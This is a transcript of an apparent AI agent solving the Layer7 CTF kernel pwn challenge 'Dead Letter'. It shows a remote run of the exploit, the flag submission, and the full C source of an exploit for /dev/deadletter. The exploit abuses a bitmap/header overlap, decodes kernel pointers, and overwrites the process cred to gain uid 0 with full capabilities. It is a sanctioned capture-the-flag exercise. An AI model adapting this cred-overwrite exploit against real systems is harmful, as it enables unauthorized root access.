@@ -1,0 +1,486 @@
+captured_at=2026-11-21T02:49:06.189575+00:00 rc=0 tag=7-dead-letter
+AAAAAAAAAAAAAAAAAAAXAAAAAQAA
+> AAYAAAAAAAAAznJAAAAAAADOcgAAAAAAAAMAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
+> HQAAAAEAAAACAAAAAAAAAACAQAAAAAAAAIAAAAAAAABIEAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAA
+> AAAAAAAAACUAAAABAAAAAgAAAAAAAABIkEAAAAAAAEiQAAAAAAAAoAAAAAAAAAAAAAAAAAAAAAgA
+> AAAAAAAAAAAAAAAAAAAvAAAADgAAAAMAAAAAAAAAuK9AAAAAAAC4nwAAAAAAAAgAAAAAAAAAAAAA
+> AAAAAAAIAAAAAAAAAAgAAAAAAAAAOwAAAA8AAAADAAAAAAAAAMCvQAAAAAAAwJ8AAAAAAAAIAAAA
+> AAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAEcAAAABAAAAAwAAAAAAAADIr0AAAAAAAMifAAAA
+> AAAAGAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABUAAAAAQAAAAMAAAAAAAAA4K9AAAAA
+> AADgnwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAWQAAAAEAAAADAAAAAAAA
+> AOivQAAAAAAA6J8AAAAAAAAYAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAGIAAAABAAAA
+> AwAAAAAAAAAAsEAAAAAAAACgAAAAAAAAGAIAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAABo
+> AAAACAAAAAMAAAAAAAAAILJAAAAAAAAYogAAAAAAAAgHAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAA
+> AAAAAAAAbQAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAGKIAAAAAAABSAAAAAAAAAAAAAAAAAAAAAQAA
+> AAAAAAABAAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAGqiAAAAAAAAdgAAAAAAAAAAAAAA
+> AAAAAAEAAAAAAAAAAAAAAAAAAAA=
+> EOFX
+/ $ base64 -d /tmp/b64 > /tmp/x && chmod +x /tmp/x && ls -l /tmp/x
+-rwxr-xr-x    1 ctf      ctf          42656 Nov 21 02:48 /tmp/x
+/ $ /tmp/x; echo EXPLOIT_RC=$?
+[*] running as uid=1000 euid=1000
+[*] opened /dev/deadletter
+[*] active handle = 0x40d47cd70720971d
+[*] active slot index = 0
+[*] page=0xffff8daf029d3000 A=0x0720971d B=0x8e28d5c5 C=0x40d47cd7 H=0x40d47cd70720971d
+[*] decoded .text+0xf0 = 0xffffffffc052a0f0  (module base 0xffffffffc052a000)
+[*] current->cred = 0xffff8daf028cf180 (slot[0x40]=0x0000000000000000)
+[*] letter[0x18]=0x33a01db06211b63c new hashes 0x68278b7fbee90205 / 0x6743e3a5b880042c
+[*] token = 0x000000006a26a23f
+[*] call #1 -> 0xffffffffc052a120 (enc 0x6a71d1e9b82673a3)
+[*] send #1 returned, result=0x0
+[*] cred[0..0x2f]: 00000003 00000000 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 00000000 00000000 
+[*] call #2 -> 0xffffffffc052a2b0 (enc 0x6a71d1e9bb0673a3)
+[*] send #2 returned, result=0x0
+[*] cred patched: uid=0 euid=0
+[+] FLAG: Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}
+
+EXPLOIT_RC=0
+/ $ [6nexit
+[   33.565477] reboot: Power down
+
+[*] flags seen: ['Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}']
+> build · deepseek-flash
+Got the real flag from the remote service. Submitting now.
+[0m$ [0mcd /home/bocil/ctf/layer7 && python3 l7.py submit 7 'Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}'
+200 {
+  "correct": true,
+  "ctf_state": "active"
+}
+> build · deepseek-flash
+[0m$ [0mcd /home/bocil/ctf/layer7 && ls -la work/7/submit.json && cat work/7/submit.json; echo; date -Iseconds
+-rw-rw-r-- 1 bocil bocil 255 Nov 21 09:48 work/7/submit.json
+{
+  "submitted_at": "2026-11-21T02:48:22.620258+00:00",
+  "challenge_id": "7",
+  "flag": "Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}",
+  "http_status": 200,
+  "response": {
+    "correct": true,
+    "ctf_state": "active"
+  }
+}
+2026-11-21T09:48:26+07:00
+> build · deepseek-flash
+[0m$ [0mcd /home/bocil/ctf/layer7 && cat work/7/exploit.c
+// Dead Letter - Layer7 CTF 2026
+// Kernel module /dev/deadletter exploit.
+//
+// Reversed interface:
+//   ioctl 0x40084b40: {u16 idx; u16 pad; u32 pad2}  -> bts bitmap[page+0x100], idx
+//   ioctl 0x40184b41: {u32 off; u32 len; u64 buf; u32 mode; u32 flags}
+//        mode 0: read  (header[0x10]+off) -> user
+//        mode 1: write user -> (header[0x10]+off)
+//        mode 2: read  (ctx[0x38]+off) -> user   (bound ctx[0x40])
+//      access bound is header[8]; the bitmap overlaps the header at
+//      page+0x180, so we can OR bits into header[8].
+//   ioctl 0xc0184b42: {u64 handle; u64 token; u64 result}
+//        finds slot by handle, checks signature + hash, then calls the
+//        decoded function pointer slot[0x10] with rdi = ctx.
+//
+// The slot / header / letter structures live on one zeroed page:
+//   page+0x100 : bitmap   page+0x180 : header   page+0x200 : body
+//   page+0x400 : 9 slots (0x80 each)   page+0xc00 : letter (0x80)
+//
+// We raise the bound, dump the page, recover the active slot + master key,
+// then perform two authenticated calls:
+//   0x120 -> validates letter and stores current->cred into ctx[0x38]
+//   0x2b0 -> sets header[0x10] = current->cred
+// Finally mode 1 overwrites our cred (uid/gid = 0, full caps) and reads /flag.
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <errno.h>
+
+#define CMD_BIT   0x40084b40UL
+#define CMD_RW    0x40184b41UL
+#define CMD_SEND  0xc0184b42UL
+
+struct rw_req {
+    uint32_t off;
+    uint32_t len;
+    uint64_t buf;
+    uint32_t mode;
+    uint32_t flags;
+};
+
+struct send_req {
+    uint64_t handle;
+    uint64_t token;
+    uint64_t result;
+};
+
+static int fd;
+
+static uint64_t rol64(uint64_t x, int n) { n &= 63; return (x << n) | (x >> ((64 - n) & 63)); }
+static uint64_t ror64(uint64_t x, int n) { n &= 63; return (x >> n) | (x << ((64 - n) & 63)); }
+static uint32_t rol32(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }
+
+static void set_bit(uint16_t idx) {
+    uint8_t b[8];
+    memset(b, 0, sizeof(b));
+    memcpy(b, &idx, 2);
+    if (ioctl(fd, CMD_BIT, b) != 0) {
+        fprintf(stderr, "[!] set_bit(%#x): %s\n", idx, strerror(errno));
+    }
+}
+
+static int page_read_chunk(uint32_t off, void *dst, uint32_t len) {
+    struct rw_req r;
+    r.off = off; r.len = len; r.buf = (uint64_t)dst; r.mode = 0; r.flags = 0;
+    return ioctl(fd, CMD_RW, &r);
+}
+
+static int page_read(uint32_t off, void *dst, uint32_t len) {
+    uint8_t *p = dst;
+    while (len) {
+        uint32_t c = len > 0x800 ? 0x800 : len;
+        int ret = page_read_chunk(off, p, c);
+        if (ret != 0) return ret;
+        p += c; off += c; len -= c;
+    }
+    return 0;
+}
+
+static int page_write(uint32_t off, const void *src, uint32_t len) {
+    struct rw_req r;
+    r.off = off; r.len = len; r.buf = (uint64_t)src; r.mode = 1; r.flags = 0;
+    return ioctl(fd, CMD_RW, &r);
+}
+
+static int cred_read(uint32_t off, void *dst, uint32_t len) {
+    struct rw_req r;
+    r.off = off; r.len = len; r.buf = (uint64_t)dst; r.mode = 2; r.flags = 0;
+    return ioctl(fd, CMD_RW, &r);
+}
+
+static int send_call(uint64_t handle, uint64_t token, uint64_t *result) {
+    struct send_req r;
+    r.handle = handle; r.token = token; r.result = 0;
+    int ret = ioctl(fd, CMD_SEND, &r);
+    if (result) *result = r.result;
+    return ret;
+}
+
+/* ---- hashes replicated from the module ---- */
+static uint64_t func0(const uint64_t *L, const uint64_t *S) {
+    uint64_t r8 = 0x510e527fade682d1ULL ^ S[1];
+    uint64_t rsi = 0x9e3779b97f4a7c15ULL;
+    const uint64_t r9 = rsi;
+    const uint64_t r10 = 0xd6e8feb86659fd93ULL;
+    int ecx = 0xd, rdx = 0;
+    do {
+        if (rdx != 5) {
+            uint64_t rax = L[rdx] + rsi;
+            rax ^= r8;
+            rax = rol64(rax, ecx);
+            rax *= r10;
+            r8 = rax;
+        }
+        ecx += 7;
+        rdx += 1;
+        rsi += r9;
+    } while (ecx != 0x45);
+    return r8 ^ (r8 >> 0x1d);
+}
+
+static uint64_t func70(const uint64_t *L, const uint64_t *S) {
+    uint64_t rdx = 0x1f83d9abfb41bd6bULL ^ S[1];
+    uint32_t esi = 0;
+    uint64_t r8 = 0xc7069c1dfa2d2477ULL;
+    const uint64_t r9 = 0xa24baed4963ee407ULL;
+    const uint64_t r10 = 0xae4c415dULL;
+    int idx = 0;
+    do {
+        uint64_t rax = L[idx++];
+        uint32_t ecx = esi;
+        rax ^= r8;
+        r8 += r9;
+        rdx += rax;
+        uint64_t t = (uint64_t)esi * r10;
+        t >>= 0x25;
+        uint32_t ea = (uint32_t)t * 0x2f;
+        ecx -= ea;
+        rax = rdx;
+        ecx += 0xb;
+        rax = rol64(rax, ecx);
+        rdx = rax;
+        rdx ^= (rdx >> 0x17);
+        esi += 5;
+    } while (esi != 0x41);
+    return rdx ^ rol64(rdx, 0x1f);
+}
+
+static uint64_t hash_slot(const uint8_t *s) {
+    uint64_t rax = 0x6a09e667f3bcc909ULL;
+    uint64_t acc = 0x9e37UL;
+    uint32_t i = 0;
+    do {
+        uint64_t rcx;
+        uint64_t q, r;
+        uint32_t eax, edx, idx;
+        uint16_t val;
+
+        rax = rol64(rax, 9);
+        rcx = rax;
+        q = (uint64_t)i * 0x38e38e39ULL;
+        q >>= 0x23;
+        eax = (uint32_t)q * 9;
+        eax <<= 2;
+        edx = i - eax;
+        idx = edx + edx;
+        memcpy(&val, s + idx, 2);
+        r = (uint64_t)val + acc;
+        r ^= rcx;
+        r *= 0x100000001b3ULL;
+        rax = r;
+        acc += 0x9e37;
+        i += 0xd;
+    } while (acc != 0x16ddf3);
+    return rax;
+}
+
+static uint64_t enc_ptr(uint64_t key, uint64_t fn) {
+    return rol64(key + fn, 0x11) ^ ror64(key, 0xb);
+}
+
+int main(void) {
+    uint8_t page[0x1000];
+    uint64_t *slot, *letter;
+    int i, active = -1;
+    uint64_t page_ptr, H, A, B, C, W, key1, key2, f0addr, text_base;
+    uint64_t letter_val, slot40_orig, cred_ptr;
+    uint64_t token, ret;
+    uint8_t slotbuf[0x80], letterbuf[0x80];
+    uint64_t newcred[0xb0/8];
+    char flag[256];
+    int n;
+
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+
+    /* become the unprivileged recovery-console user */
+    if (setgid(1000) != 0) perror("setgid");
+    if (setuid(1000) != 0) perror("setuid");
+    printf("[*] running as uid=%d euid=%d\n", getuid(), geteuid());
+
+    fd = open("/dev/deadletter", O_RDWR);
+    if (fd < 0) { perror("open /dev/deadletter"); return 1; }
+    printf("[*] opened /dev/deadletter\n");
+
+    /* 1. Raise the body bound from 0x100 to 0x1100 by setting bit 12 of the
+     *    header size field.  The bitmap (page+0x100) overlaps the header
+     *    (page+0x180), so bit index (0x188-0x100)*8+12 = 0x44c. */
+    set_bit(0x44c);
+
+    /* 2. Dump page+0x200 .. page+0x1000 (body + slots + letter). */
+    memset(page, 0, sizeof(page));
+    if (page_read(0, page, 0xe00) != 0) {
+        perror("page_read");
+        return 1;
+    }
+
+    /* offsets inside the dump: page+0x200 == page[0] */
+    letter = (uint64_t *)(page + 0xa00);   /* page+0xc00 */
+    H = letter[4];                          /* letter[0x20] = active handle */
+    printf("[*] active handle = 0x%016lx\n", H);
+    for (i = 0; i < 9; i++) {
+        slot = (uint64_t *)(page + 0x200 + i * 0x80);
+        if (slot[1] == H) { active = i; break; }
+    }
+    if (active < 0) { printf("[!] active slot not found\n"); return 1; }
+    slot = (uint64_t *)(page + 0x200 + active * 0x80);
+    printf("[*] active slot index = %d\n", active);
+
+    page_ptr = slot[4];                     /* slot[0x20] = page */
+    /* re-read fields by byte offsets to avoid confusion */
+    {
+        uint8_t *sb = (uint8_t *)slot;
+        memcpy(&C, sb + 0x30, 4);
+        memcpy(&A, sb + 0x34, 4);
+        memcpy(&B, sb + 0x38, 4);
+        memcpy(&H, sb + 0x08, 8);
+        memcpy(&slot40_orig, sb + 0x40, 8);
+        memcpy(&W, sb + 0x30, 8);
+    }
+    printf("[*] page=0x%016lx A=0x%08x B=0x%08x C=0x%08x H=0x%016lx\n",
+           (unsigned long)page_ptr, (unsigned)A, (unsigned)B, (unsigned)C, (unsigned long)H);
+
+    key1 = (uint64_t)A * 0x100000001ULL ^ H ^ 0xd1ceb00bcafebeefULL;
+    key2 = (uint64_t)A * 0x100000001ULL ^ rol64((uint64_t)B, 0x1d) ^ H
+           ^ 0xa3a1c57fafd3c8ddULL;
+
+    /* decode the fixed .text+0xf0 pointer to recover the module base */
+    f0addr = ror64(slot[3] ^ ror64(key1, 0xb), 0x11) - key1; /* slot[0x18] */
+    text_base = f0addr - 0xf0;
+    printf("[*] decoded .text+0xf0 = 0x%016lx  (module base 0x%016lx)\n",
+           f0addr, text_base);
+    if ((f0addr & 0xfff) != 0xf0) {
+        printf("[!] pointer decode failed\n");
+        return 1;
+    }
+
+    /* decoded cred pointer from letter[0x40] */
+    letter_val = letter[8]; /* letter[0x40] */
+    {
+        cred_ptr = ror64(letter_val ^ ror64(key2, 0xb), 0x11) - key2;
+        printf("[*] current->cred = 0x%016lx (slot[0x40]=0x%016lx)\n",
+               (unsigned long)cred_ptr, (unsigned long)slot40_orig);
+        if (cred_ptr < 0xffff800000000000ULL) {
+            printf("[!] cred decode failed\n");
+            return 1;
+        }
+    }
+
+    /* 3. Prepare the letter: choose letter[0x18] so that the later
+     *    "stage1!!" check on the 64-bit slot[0x30] passes, then fix hashes. */
+    memcpy(letterbuf, letter, 0x80);
+    {
+        /* 0x2b0 checks ctx[0x30] (zeroed by __GFP_ZERO) == H ^ letter18 ^ K */
+        (void)W;
+        uint64_t l18 = H ^ 0x7374616765312121ULL;
+        memcpy(letterbuf + 0x18, &l18, 8);
+        uint64_t l28 = func0((uint64_t *)letterbuf, slot);
+        memcpy(letterbuf + 0x28, &l28, 8);
+        uint64_t l68 = func70((uint64_t *)letterbuf, slot);
+        memcpy(letterbuf + 0x68, &l68, 8);
+        printf("[*] letter[0x18]=0x%016lx new hashes 0x%016lx / 0x%016lx\n",
+               l18, l28, l68);
+    }
+
+    token = (uint64_t)(rol32(A, 7) ^ A ^ B ^ 0x73656e64U);
+    printf("[*] token = 0x%016lx\n", token);
+
+    /* 4. First send: call .text+0x120 -> validates letter, caches cred. */
+    memcpy(slotbuf, slot, 0x80);
+    {
+        uint64_t fn120 = text_base + 0x120;
+        uint64_t enc = enc_ptr(key1, fn120);
+        uint32_t l60 = (uint32_t)letter[0xc]; /* letter[0x60] */
+        uint32_t sc = l60 ^ B ^ 0x46415354U;
+        uint64_t hs;
+        memcpy(slotbuf + 0x10, &enc, 8);
+        memcpy(slotbuf + 0x3c, &sc, 4);
+        memcpy(slotbuf + 0x40, &cred_ptr, 8);
+        hs = hash_slot(slotbuf);
+        memcpy(slotbuf + 0x48, &hs, 8);
+        printf("[*] call #1 -> 0x%lx (enc 0x%016lx)\n", fn120, enc);
+    }
+    if (page_write(0xa00, letterbuf, 0x80) != 0) { perror("write letter"); return 1; }
+    if (page_write(0x200 + active * 0x80, slotbuf, 0x80) != 0) { perror("write slot"); return 1; }
+
+    if (send_call(H, token, &ret) != 0) {
+        perror("send #1");
+        return 1;
+    }
+    printf("[*] send #1 returned, result=0x%lx\n", (unsigned long)ret);
+    if (ret != 0) {
+        printf("[!] stage 1 rejected\n");
+        return 1;
+    }
+
+    /* 5. Read our cred through the newly enabled mode 2 window. */
+    memset(newcred, 0, sizeof(newcred));
+    if (cred_read(0, newcred, sizeof(newcred)) != 0) {
+        perror("cred_read");
+        return 1;
+    }
+    {
+        uint32_t *u = (uint32_t *)newcred;
+        printf("[*] cred[0..0x2f]: ");
+        for (i = 0; i < 12; i++) printf("%08x ", u[i]);
+        printf("\n");
+    }
+
+    /* 6. Second send: call .text+0x2b0 -> header[0x10] = cred. */
+    {
+        uint64_t fn2b0 = text_base + 0x2b0;
+        uint64_t enc = enc_ptr(key1, fn2b0);
+        uint64_t ctx48 = rol64(letter[0xb] ^ letter[0xc] ^ cred_ptr, 0x11);
+        uint32_t sc = (uint32_t)ctx48 ^ B ^ 0x434f4d4dU;
+        uint64_t hs;
+
+        memcpy(slotbuf, slot, 0x80);
+        memcpy(slotbuf + 0x10, &enc, 8);
+        memcpy(slotbuf + 0x3c, &sc, 4);
+        memcpy(slotbuf + 0x40, &cred_ptr, 8);
+        hs = hash_slot(slotbuf);
+        memcpy(slotbuf + 0x48, &hs, 8);
+        printf("[*] call #2 -> 0x%lx (enc 0x%016lx)\n", fn2b0, enc);
+        if (page_write(0x200 + active * 0x80, slotbuf, 0x80) != 0) { perror("write slot2"); return 1; }
+        if (send_call(H, token, &ret) != 0) { perror("send #2"); return 1; }
+        printf("[*] send #2 returned, result=0x%lx\n", (unsigned long)ret);
+        if (ret != 0) { printf("[!] stage 2 rejected\n"); return 1; }
+    }
+
+    /* 7. Patch our cred: uid/gid/suid/sgid/euid/egid/fsuid/fsgid = 0,
+     *    cap_permitted/effective/bset/ambient = all ones. */
+    {
+        uint32_t *u = (uint32_t *)newcred;
+        for (i = 2; i <= 9; i++) u[i] = 0;   /* offsets 8..39 : ids */
+        u[10] = 0;                            /* securebits */
+        uint64_t caps = 0x000001ffffffffffULL;
+        memcpy((uint8_t *)newcred + 44, &caps, 8);  /* cap_inheritable */
+        memcpy((uint8_t *)newcred + 52, &caps, 8);  /* cap_permitted */
+        memcpy((uint8_t *)newcred + 60, &caps, 8);  /* cap_effective */
+        memcpy((uint8_t *)newcred + 68, &caps, 8);  /* cap_bset */
+        memcpy((uint8_t *)newcred + 76, &caps, 8);  /* cap_ambient */
+    }
+    if (page_write(0, newcred, sizeof(newcred)) != 0) {
+        perror("cred write");
+        return 1;
+    }
+    printf("[*] cred patched: uid=%d euid=%d\n", getuid(), geteuid());
+
+    /* 8. Read the flag. */
+    {
+        int ff = open("/flag", O_RDONLY);
+        if (ff < 0) {
+            perror("open /flag");
+            return 1;
+        }
+        n = read(ff, flag, sizeof(flag) - 1);
+        if (n < 0) { perror("read /flag"); return 1; }
+        flag[n] = 0;
+        close(ff);
+        printf("[+] FLAG: %s\n", flag);
+        if (flag[n-1] != '\n') printf("\n");
+    }
+    return 0;
+}
+> build · deepseek-flash
+[0m← [0mWrite solves/7.md
+Created file successfully: solves/7.md
+> build · deepseek-flash
+[0m$ [0mcd /home/bocil/ctf/layer7 && cat >> state/PROGRESS.md <<'EOF'
+7 | SOLVED | pwn "Dead Letter": kernel 6.1 misc module /dev/deadletter. Bitmap ioctl bts at page+0x100 overlaps header at page+0x180; set bit 0x44c -> bound 0x1100, dump page+0x200..0x1000. Recovered active random slot, key1/key2, module base and current->cred from encoded pointers. Two authenticated SEND ioctls call module gates 0x120 (cache cred) then 0x2b0 (header[0x10]=cred), then mode-1 body write overwrites cred uid/gid=0 + full caps and reads /flag. Remote flag Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}; submit 200 correct. | selesai; write-up `solves/7.md`, exploit `work/7/exploit.c`, uploader `work/7/remote.py`.
+EOF
+tail -3 state/PROGRESS.md; echo "=== front matter ==="; head -9 solves/7.md; ls -la work/7/remote.log
+20 | SOLVED | rev "Prism Box" (961 pts). Reversed `prism` static ELF into exact Python simulator (validated 0 diff on all 24 ticks x16 cells x4 channels, both exposures; also matches remote tick-16 display). Puzzle: choose 1 of 4 mount options per socket, exactly 4 each P/J/D/L = multinomial 63,063,000. OpenMP C brute force with early target rejection found layout `P3P1J0L1J1P1L3L2J2L2D1J1P3D1D0D0` in 92s; 29/29 + 30/30 targets. Remote check accepted and returned flag; submitted to platform (correct=true). | DONE — artefacts in work/20/ (prism_model.py, brute.c, data.h, verify.py, solution.txt, remote_check.json, submit.json), write-up solves/20.md.
+7 | SOLVED | pwn "Dead Letter": kernel 6.1 misc module /dev/deadletter. Bitmap ioctl bts at page+0x100 overlaps header at page+0x180; set bit 0x44c -> bound 0x1100, dump page+0x200..0x1000. Recovered active random slot, key1/key2, module base and current->cred from encoded pointers. Two authenticated SEND ioctls call module gates 0x120 (cache cred) then 0x2b0 (header[0x10]=cred), then mode-1 body write overwrites cred uid/gid=0 + full caps and reads /flag. Remote flag Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}; submit 200 correct. | selesai; write-up `solves/7.md`, exploit `work/7/exploit.c`, uploader `work/7/remote.py`.
+=== front matter ===
+---
+id: 7
+title: Dead Letter
+category: pwn
+points: 974
+solved_at: 2026-11-21T09:48:22+07:00
+flag: Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}
+status: verified
+---
+-rw-rw-r-- 1 bocil bocil 65455 Nov 21 09:48 work/7/remote.log
+> build · deepseek-flash
+Challenge 7 solved and verified.
+
+Status: SOLVED
+Flag: Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}
+Tried: reversed `deadletter.ko`; found bitmap/header overlap (bit 0x44c raises bound to 0x1100); dumped slot page, recovered active slot + key1/key2 + module base + `current->cred`; used two authenticated SEND calls (gates `0x120` then `0x2b0`) to point `header[0x10]` at cred, then patched uid/gid/caps and read `/flag`; local QEMU test with fake flag, then remote upload (musl static, 42 KB) and real flag.
+Next: none for this target; write-up and artifacts are saved.
+Files written: `solves/7.md`, `work/7/exploit.c`, `work/7/exploit`, `work/7/exploit_musl`, `work/7/remote.py`, `work/7/remote.log`, `work/7/disasm.txt`, `work/7/reloc_disasm.txt`, `work/7/initramfs_test*.cpio.gz`, `work/7/submit.json`; updated `state/PROGRESS.md`.
